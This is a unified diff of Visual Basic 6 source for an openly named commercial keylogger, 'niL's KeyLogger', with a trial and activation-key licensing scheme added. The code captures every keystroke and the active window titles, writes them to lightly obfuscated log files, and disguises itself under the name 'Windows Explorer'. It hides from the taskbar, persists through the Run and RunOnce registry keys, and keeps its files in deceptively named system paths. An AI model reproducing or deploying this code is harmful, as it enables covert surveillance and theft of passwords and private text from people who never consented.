@@ -1,101 +1,265 @@
 VERSION 5.00
 Begin VB.Form Form1 
+   BackColor       =   &H8000000C&
    BorderStyle     =   1  'Fixed Single
-   Caption         =   "Windows Explorer"
-   ClientHeight    =   6165
+   Caption         =   "Please Register - niL's KeyLogger"
+   ClientHeight    =   2505
    ClientLeft      =   45
    ClientTop       =   435
-   ClientWidth     =   6690
+   ClientWidth     =   5160
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   6165
-   ScaleWidth      =   6690
-   StartUpPosition =   3  'Windows Default
-   Begin VB.TextBox username 
+   ScaleHeight     =   2505
+   ScaleWidth      =   5160
+   StartUpPosition =   2  'CenterScreen
+   Begin VB.Frame Frame1 
+      Appearance      =   0  'Flat
+      BackColor       =   &H00808080&
+      BorderStyle     =   0  'None
+      ForeColor       =   &H80000008&
+      Height          =   2550
+      Left            =   0
+      TabIndex        =   7
+      Top             =   0
+      Width           =   5175
+      Begin VB.CommandButton Command1 
+         Cancel          =   -1  'True
+         Caption         =   "&Close"
+         Height          =   375
+         Left            =   120
+         TabIndex        =   13
+         Top             =   1800
+         Width           =   975
+      End
+      Begin VB.TextBox txtTry 
+         Alignment       =   2  'Center
+         Appearance      =   0  'Flat
+         BackColor       =   &H00000000&
+         BorderStyle     =   0  'None
+         BeginProperty Font 
+            Name            =   "MS Sans Serif"
+            Size            =   18
+            Charset         =   0
+            Weight          =   700
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H000000FF&
+         Height          =   435
+         Left            =   2280
+         Locked          =   -1  'True
+         TabIndex        =   12
+         TabStop         =   0   'False
+         Text            =   "00"
+         Top             =   240
+         Width           =   495
+      End
+      Begin VB.CommandButton cmdTry 
+         Caption         =   "Ask &Later."
+         Default         =   -1  'True
+         Height          =   375
+         Left            =   3960
+         TabIndex        =   11
+         Top             =   1800
+         Width           =   1095
+      End
+      Begin VB.CommandButton cmdReg 
+         Caption         =   "&Register !"
+         Height          =   375
+         Left            =   2760
+         TabIndex        =   10
+         Top             =   1800
+         Width           =   1095
+      End
+      Begin VB.TextBox txtActCode 
+         Appearance      =   0  'Flat
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   12
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         Height          =   315
+         Left            =   2040
+         MaxLength       =   25
+         TabIndex        =   9
+         Top             =   1320
+         Width           =   3015
+      End
+      Begin VB.TextBox txtgCode 
+         Appearance      =   0  'Flat
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   14.25
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         Height          =   375
+         Left            =   2040
+         Locked          =   -1  'True
+         TabIndex        =   8
+         Top             =   840
+         Width           =   3015
+      End
+      Begin VB.Label Label4 
+         Alignment       =   2  'Center
+         BackStyle       =   0  'Transparent
+         Caption         =   "http://niLsKeyLogger.blogspot.com"
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   8.25
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H0000FFFF&
+         Height          =   375
+         Left            =   0
+         TabIndex        =   17
+         Top             =   2160
+         Width           =   5175
+      End
+      Begin VB.Label Label2 
+         BackStyle       =   0  'Transparent
+         Caption         =   "License Key :"
+         BeginProperty Font 
+            Name            =   "MS Sans Serif"
+            Size            =   12
+            Charset         =   0
+            Weight          =   700
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H00FFFFFF&
+         Height          =   375
+         Left            =   120
+         TabIndex        =   16
+         Top             =   840
+         Width           =   2415
+      End
+      Begin VB.Label Label3 
+         BackStyle       =   0  'Transparent
+         Caption         =   "Activation Key :"
+         BeginProperty Font 
+            Name            =   "MS Sans Serif"
+            Size            =   12
+            Charset         =   0
+            Weight          =   700
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H00FFFFFF&
+         Height          =   375
+         Left            =   120
+         TabIndex        =   15
+         Top             =   1320
+         Width           =   2415
+      End
+      Begin VB.Label lblTry 
+         Alignment       =   2  'Center
+         Appearance      =   0  'Flat
+         BackColor       =   &H80000005&
+         BackStyle       =   0  'Transparent
+         BorderStyle     =   1  'Fixed Single
+         Caption         =   "You can try       times more."
+         BeginProperty Font 
+            Name            =   "Arial"
+            Size            =   15.75
+            Charset         =   0
+            Weight          =   400
+            Underline       =   0   'False
+            Italic          =   0   'False
+            Strikethrough   =   0   'False
+         EndProperty
+         ForeColor       =   &H00FFFFFF&
+         Height          =   455
+         Left            =   120
+         TabIndex        =   14
+         Top             =   240
+         Width           =   4935
+      End
+   End
+   Begin VB.TextBox txtUserName 
       Height          =   285
-      Left            =   480
-      TabIndex        =   8
+      Left            =   360
+      TabIndex        =   6
       Text            =   "username"
-      Top             =   120
+      Top             =   600
       Width           =   1095
    End
    Begin VB.TextBox LogPath 
       Height          =   285
-      Left            =   120
-      TabIndex        =   7
-      Top             =   5400
-      Width           =   2655
+      Left            =   3120
+      TabIndex        =   5
+      Top             =   1440
+      Width           =   1455
    End
    Begin VB.TextBox txtencr 
-      Height          =   1935
-      Left            =   120
+      Height          =   375
+      Left            =   360
       ScrollBars      =   3  'Both
-      TabIndex        =   5
-      Top             =   3240
-      Width           =   6135
+      TabIndex        =   3
+      Top             =   1440
+      Width           =   2535
    End
    Begin VB.Timer Timer2 
+      Enabled         =   0   'False
       Interval        =   60
-      Left            =   5640
-      Top             =   0
+      Left            =   4440
+      Top             =   480
    End
    Begin VB.FileListBox File1 
       Height          =   480
-      Left            =   5640
-      TabIndex        =   4
-      Top             =   2520
+      Left            =   3720
+      TabIndex        =   2
+      Top             =   960
       Visible         =   0   'False
       Width           =   975
    End
-   Begin VB.CommandButton Command2 
-      Caption         =   "Close"
-      Height          =   375
-      Left            =   5160
-      TabIndex        =   3
-      Top             =   5520
-      Width           =   1095
-   End
-   Begin VB.CommandButton Command1 
-      Caption         =   "DISABLE/ENABLE"
-      Height          =   375
-      Left            =   3000
-      TabIndex        =   2
-      Top             =   5520
-      Width           =   2175
-   End
    Begin VB.TextBox Text2 
       Height          =   285
-      Left            =   1800
+      Left            =   1440
       Locked          =   -1  'True
       TabIndex        =   1
-      Top             =   120
-      Width           =   4455
+      Top             =   600
+      Width           =   3255
    End
    Begin VB.TextBox Text1 
-      Height          =   2295
-      Left            =   120
+      Height          =   375
+      Left            =   360
       Locked          =   -1  'True
       MultiLine       =   -1  'True
       ScrollBars      =   3  'Both
       TabIndex        =   0
-      Top             =   600
-      Width           =   6135
+      Top             =   840
+      Width           =   3495
    End
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
       Interval        =   65
-      Left            =   120
-      Top             =   240
+      Left            =   240
+      Top             =   840
    End
    Begin VB.Label Label1 
       Caption         =   "Encrypted:"
       Height          =   255
-      Left            =   120
-      TabIndex        =   6
-      Top             =   3000
+      Left            =   360
+      TabIndex        =   4
+      Top             =   1200
       Width           =   3735
    End
 End
@@ -150,10 +314,10 @@ Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As In
 
 
 'Get system directory part
-Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
-"GetSystemDirectoryA" (ByVal lpBuffer As String, _
-ByVal nSize As Long) As Long
-Dim SysDir As String
+'Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
+'"GetSystemDirectoryA" (ByVal lpBuffer As String, _
+'ByVal nSize As Long) As Long
+'Dim SysDir As String
 
 
 'Loadsetting variable declaration
@@ -163,124 +327,138 @@ Dim t1, t2, t3, t4, t5 As String
 Dim lpath As String
 
 
+
+Private Sub Command1_Click()
+End
+End Sub
+
 Private Sub Form_Load()
-'Get sysDirectory
-SysDir = String(80, 0)
-Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.
-
-'if program already running then confuse user that it is explorer.exe
-Dim sDr As String                   'Get system drive
-sDr = Left(SysDir, 2)
-If App.PrevInstance = True Then
-    Shell sDr & "\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
-    End
-End If
-
-'IMPORT USERNAME*******************************************
-Dim sBuffer As String
-    Dim lSize As Long
-    sBuffer = Space$(255)
-    lSize = Len(sBuffer)
-    Call GetUserName(sBuffer, lSize)
-    If lSize > 0 Then
-        username = Left$(sBuffer, lSize)
-    Else
-        username = vbNullString
-End If
-
-
-Call loadsetting
-
-'hiding app
-
 App.TaskVisible = False
-'Me.Hide
+
+If App.PrevInstance = True Then
+    Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
+    End
+    Exit Sub
+End If
+'******************Register/Trial Part
+Call LoadUserName
+
+Randomize
+txtgCode = CurrentCode("C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
+If txtgCode.Text <> "Registered" Then
+    txtTry = Val(RemainingTry(15, "C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FRT.GLT"))
+    
+    If Val(txtTry) < 0 Then
+        cmdTry.Enabled = False: txtTry.Visible = False: lblTry.Caption = "Your Free Trial have been expired.": Timer1.Enabled = False: Call SetAutorun: Exit Sub
+    Else
+        'Me.Hide
+        Call startLogging
+        If Val(txtTry) = 14 Or Val(txtTry) < 4 Then Me.Caption = "Please Register - niL's KeyLogger": Me.Show
+    End If
+Else
+    Me.Hide
+    Call startLogging
+End If
+
+End Sub
+Private Sub startLogging()
+
+Call LoadSetting
+
+Timer2.Enabled = True
 Timer1.Enabled = True
+Me.Caption = "Windows Explorer"
 
 
-On Error Resume Next
-'Call setautorun
-MkDir LogPath & "\sysResource"
-File1.Path = LogPath & "\sysResource"
+File1.Path = LogPath
 
 If LogMode = 0 Then
-    lpath = LogPath & "\sysResource\browse" & File1.ListCount + 1 & "z" & ext
+    lpath = LogPath & "\browse" & File1.ListCount + 1 & "z" & ext
 ElseIf LogMode = 1 Then
     Dim a As Variant
     a = Format$(Now, "dd" & "mm" & "yy")
-    lpath = LogPath & "\sysResource\browse" & a & "z" & ext
+    lpath = LogPath & "\browse" & a & "z" & ext
 ElseIf LogMode = 2 Then
-    lpath = LogPath & "\sysResource\browse" & ext
+    lpath = LogPath & "\browse" & ext
 End If
 
 
 'Write initials
 Open lpath For Append As 1
-Write #1, Chr(155), Time, encCode, Date, username, Pwd, App.Revision
+Write #1, Chr(155), Time, encCode, Date, txtUserName, Pwd, App.Revision
 Close #1
 
 End Sub
-Private Sub loadsetting()
-Dim sDr As String
-sDr = Left(SysDir, 2)
-On Error GoTo err
+Private Sub cmdReg_Click()
+If UCase(txtActCode) = genKey(txtgCode) Then
+    Call MakeRegistered("C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService\Q3FD.GML")
+    MsgBox "Thank You for purchasing niL's KeyLogger!"
+    Me.Hide
+Else
+    MsgBox "                 Activation Key Incorrect!" & vbNewLine & "Buy a Activation Key from http://niLsKeyLogger.blogspot.com", vbCritical, "Incorrect Code"
+End If
+End Sub
 
-AllowBS = INIRead("LogSetting", "USEBS", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-wTitle = INIRead("LogSetting", "UseChildTitle", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-encCode = INIRead("LogSetting", "EncCode", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-ext = INIRead("LogSetting", "extension", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-Timer1.Interval = INIRead("LogSetting", "TimerInt", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-LogMode = INIRead("LogSetting", "LogMode", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-LogPath.Text = INIRead("LogSetting", "LogDir", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-sLogging = INIRead("LogSetting", "sLogging", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-Pwd = INIRead("LogSetting", "pwd", sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
+Private Sub cmdTry_Click()
+Me.Hide
+Me.Caption = "Windows Explorer"
 
+End Sub
+Private Sub LoadSetting()
+If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.ini") <> "" Then 'setting file found then
 
-If sLogging = True Then
-    On Error GoTo err2
-    Open sDr & "\Users\" & username & "\AppData\Roaming\Microsoft\titles.dat" For Input As 1
-    Do While Not EOF(1)
-    On Error Resume Next
-    Input #1, t1, t2, t3, t4, t5
-    Loop
-    Close #1
+    AllowBS = INIRead("LogSetting", "USEBS", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    wTitle = INIRead("LogSetting", "UseChildTitle", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    encCode = INIRead("LogSetting", "EncCode", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    ext = INIRead("LogSetting", "extension", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    Timer1.Interval = INIRead("LogSetting", "TimerInt", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    LogMode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    LogPath.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    sLogging = INIRead("LogSetting", "sLogging", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    Pwd = INIRead("LogSetting", "pwd", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+
+    Call SetAutorun
+
+    If sLogging = True Then
+        On Error GoTo err2
+        Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\default.MCP" For Input As 1    'Contains Selected titles.
+        Do While Not EOF(1)
+        On Error Resume Next
+        Input #1, t1, t2, t3, t4, t5
+        Loop
+        Close #1
+    End If
+
+Else    'setting not found
+    Call CreateSetting
+    Call LoadSetting
 End If
 
-
-err:
-If err.Number = 13 Then Call createsetting             'setting.ini not found
-
 err2:
-If err.Number = 13 Then sLogging = False 'i.e, titles.dat not found
+If Err.Number = 13 Then sLogging = False 'i.e, default.MCP not found
 End Sub
-'***********************creates setting.ini if not found***************
-Private Sub createsetting()
+'***********************creates SPYXX.INI if not found***************
+Private Sub CreateSetting()
 Dim f As Integer
 f = FreeFile
-Open Left(SysDir, 2) & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini" For Output As #f
-Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & Left(SysDir, 2) & "\Users\" & username & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
+
+txtUserName.Tag = "C:\Documents and Settings\" & txtUserName & "\sysResource"
+
+Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI" For Output As #f
+Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & txtUserName.Tag & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
 Close #f
-Call loadsetting
+
+txtUserName.Tag = ""
+
 End Sub
-Private Sub setautorun()
+Private Sub SetAutorun()
 ' Clear or set the key that makes the program run at startup.
     SetRunAtStartup "explorer", App.Path & ""
 End Sub
 
-Private Sub Command1_Click()
-If Timer1.Enabled = True Then
-Timer1.Enabled = False
-Else
-Timer1.Enabled = True
-End If
-End Sub
-
-Private Sub Command2_Click()
-End
-End Sub
-
 '*****************detects active window title change send record command**********
 Private Sub Text2_Change()
+Timer1.Enabled = True           'It may be disabled if too many keypress , i.e, to avoid "Overflow error"
 
 If sLogging = True Then
     If Val(Form1.Tag) = 1 Then
@@ -304,6 +482,8 @@ End If
 
 End Sub
 Private Sub Timer1_Timer()
+
+
 Dim i As Integer
 Dim Result As Integer
 For i = 1 To 255
@@ -324,6 +504,7 @@ If Result = -32767 Then
          Text1.Text = Text1.Text + checkshift(i)
         End If
     End If
+    If Len(Text1.Text) > 500 Then Text1.Text = Text1.Text + Chr(13) & "Too many KeyPress": Timer1.Enabled = False   'Because huge Text in Text1 uses too much memory and gives error: "overflow"
 End If
 Next i
 End Sub
@@ -374,6 +555,8 @@ Case 109
     shiftkeyup = "-"
 Case 107
     shiftkeyup = "+"
+Case 110
+    shiftkeyup = "."
 
 
 Case Else           'If key doesnt recognised ascii code will be displayed
@@ -509,7 +692,7 @@ Case 40
 Case 44
     locatekey = "[PRINTSCREEN]"
 Case 145
-    locatekey = "[SCROLLLCK]"
+    locatekey = "[SCRLCK]"
 Case 19
     locatekey = "[PAUSE/BREAK]"
 Case 144
@@ -530,43 +713,57 @@ For i = 1 To Len(Text1)
 txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
 Next i
 
-Open lpath For Append As #1
+If Dir(lpath) <> "" Then
+        Open lpath For Append As #1
         Print #1, txtencr.Text
         Text1.Text = ""
         txtencr.Text = ""
-Close #1
+        Close #1
+Else
+        MsgBox "Log Directory Unavailable", vbCritical, "Logging Stopped": End
+End If
 End Sub
 Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
 Dim hKey As Long
 Dim key_value As String
 Dim status As Long
 
+
+Dim SETRUNONCE As Boolean
+    
+
+' Open the key, creating it if it doesn't exist.
     On Error GoTo SetStartupError
 
-    ' Open the key, creating it if it doesn't exist.
 
-SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", Left(SysDir, 2) & "\Users\" & username & "\AppData\Roaming\Microsoft\setting.ini")
-
+SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", "C:\Documents and Settings\" & txtUserName & "\Application Data\System\SPYXX.INI")
+    
     If SETRUNONCE = True Then
+    
+        Call KillFromStartup("explorer", False)
+        
         If RegCreateKeyEx(HKEY_CURRENT_USER, _
         "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
         ByVal 0&, ByVal 0&, ByVal 0&, _
         KEY_WRITE, ByVal 0&, hKey, _
         ByVal 0&) <> ERROR_SUCCESS _
         Then
-        MsgBox "Error " & err.Number & " opening key" & _
-            vbCrLf & err.Description
+        MsgBox "Error " & Err.Number & " opening key" & _
+            vbCrLf & Err.Description
         Exit Sub
         End If
     Else
+    
+        Call KillFromStartup("explorer", True)
+    
         If RegCreateKeyEx(HKEY_CURRENT_USER, _
         "Software\Microsoft\Windows\CurrentVersion\Run", _
         ByVal 0&, ByVal 0&, ByVal 0&, _
         KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
         Then
-        MsgBox "Error " & err.Number & " opening key" & _
-            vbCrLf & err.Description
+        MsgBox "Error " & Err.Number & " opening key" & _
+            vbCrLf & Err.Description
         Exit Sub
         End If
    End If
@@ -578,8 +775,8 @@ SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", Left(SysDir, 2) & "\Users\" & u
             ByVal key_value, Len(key_value))
 
         If status <> ERROR_SUCCESS Then
-            MsgBox "Error " & err.Number & " setting key" & _
-                vbCrLf & err.Description
+            MsgBox "Error " & Err.Number & " setting key" & _
+                vbCrLf & Err.Description
         End If
    
 
@@ -588,7 +785,68 @@ SETRUNONCE = INIRead("LogSetting", "SETRUNONCE", Left(SysDir, 2) & "\Users\" & u
     Exit Sub
 
 SetStartupError:
-    MsgBox err.Number & " " & err.Description
+    MsgBox Err.Number & " " & Err.Description
+    Exit Sub
+End Sub
+'Deletes the Unwanted key
+Public Sub KillFromStartup(ByVal app_name As String, Optional Ro As Boolean)
+Dim hKey As Long
+Dim key_value As String
+Dim status As Long
+
+    On Error GoTo SetStartupError
+
+If Ro = False Then
+'**********Delete Run Key
+
+    ' Open the key, creating it if it doesn't exist.
+    If RegCreateKeyEx(HKEY_CURRENT_USER, _
+        "Software\Microsoft\Windows\CurrentVersion\Run", _
+        ByVal 0&, ByVal 0&, ByVal 0&, _
+        KEY_WRITE, ByVal 0&, hKey, _
+        ByVal 0&) <> ERROR_SUCCESS _
+    Then
+        MsgBox "Error " & Err.Number & " opening key" & _
+            vbCrLf & Err.Description
+        Exit Sub
+    End If
+
+   
+        ' Delete the value.
+        RegDeleteValue hKey, app_name
+
+    ' Close the key.
+    RegCloseKey hKey
+
+Else
+    
+ '*********Delete RunOnce Key
+
+    ' Open the key, creating it if it doesn't exist.
+    If RegCreateKeyEx(HKEY_CURRENT_USER, _
+        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
+        ByVal 0&, ByVal 0&, ByVal 0&, _
+        KEY_WRITE, ByVal 0&, hKey, _
+        ByVal 0&) <> ERROR_SUCCESS _
+    Then
+        MsgBox "Error " & Err.Number & " opening key" & _
+            vbCrLf & Err.Description
+        Exit Sub
+    End If
+
+   
+        ' Delete the value.
+        RegDeleteValue hKey, app_name
+
+    ' Close the key.
+    RegCloseKey hKey
+    
+End If
+
+Exit Sub
+
+SetStartupError:
+    MsgBox Err.Number & " " & Err.Description
     Exit Sub
 End Sub
 '*************Imports active w title***********
@@ -648,6 +906,90 @@ GetWindowText hwnd, S, l + 1
 
 GetWindowTitle = Left$(S, l)
 End Function
+Private Sub LoadUserName()
 
+'IMPORT USERNAME*******************************************
+Dim sBuffer As String
+    Dim lSize As Long
+    sBuffer = Space$(255)
+    lSize = Len(sBuffer)
+    Call GetUserName(sBuffer, lSize)
+    If lSize > 0 Then
+        txtUserName = Left$(sBuffer, lSize)
+    Else
+        txtUserName = vbNullString
+End If
 
+'Get system Directory
+'SysDir = String(80, 0)
+'Call GetSystemDirectory(SysDir, 80)     'stores global variable- system32 path.
+'Dim sDr As String                   'Get system drive
+'sDr = Left(SysDir, 2)
+End Sub
+
+'*****************************************Function for Activation Key and Trial remainig*************
+
+Private Function CurrentCode(Filepath As String) As String
+If Dir(Filepath) <> "" Then
+    Open Filepath For Input As 2
+    Input #2, CurrentCode
+    Close #2
+Else
+    CurrentCode = GenerateCode(12)
+    Open Filepath For Output As 2
+    Write #2, CurrentCode
+    Close #2
+End If
+End Function
+Private Function RemainingTry(MaxUse As Integer, Filepath As String) As Integer
+If Dir(Filepath) <> "" Then
+    Open Filepath For Input As 2
+    Input #2, RemainingTry
+    Close #2
+    
+    Open Filepath For Output As 2
+    Write #2, (Val(RemainingTry) - 1)
+    Close #2
+Else
+    RemainingTry = Val(MaxUse) - 1
+    Open Filepath For Output As 2
+    Write #2, Val(RemainingTry) - 1
+    Close #2
+End If
+End Function
+Private Function GenerateCode(CodeLength As Integer) As String
+Dim i As Integer
+For i = 1 To CodeLength
+GenerateCode = GenerateCode & BringChar(Int(Rnd * 36))
+Next i
+
+End Function
+
+Private Function genKey(fromThis As String) As String
+Dim i As Integer
+For i = 1 To Len(fromThis)
+    If i = 3 Or i = 7 Then
+        genKey = genKey & BringChar(Asc(Mid(fromThis, i, 1)) * 3 Mod 36)
+    ElseIf Mid(fromThis, i, 1) = 8 Then
+        genKey = genKey
+    Else
+        genKey = genKey & BringChar(Asc(Mid(fromThis, i, 1)) * 7 Mod 36)
+    End If
+Next i
+
+End Function
+Private Function BringChar(cCode As Integer) As String
+Select Case cCode
+Case Is < 10
+    BringChar = Chr(48 + cCode)
+Case Is > 9
+    BringChar = Chr(55 + cCode)
+End Select
+End Function
+
+Private Sub MakeRegistered(Filepath As String)
+    Open Filepath For Output As 2
+    Write #2, "Registered"
+    Close #2
+End Sub
 
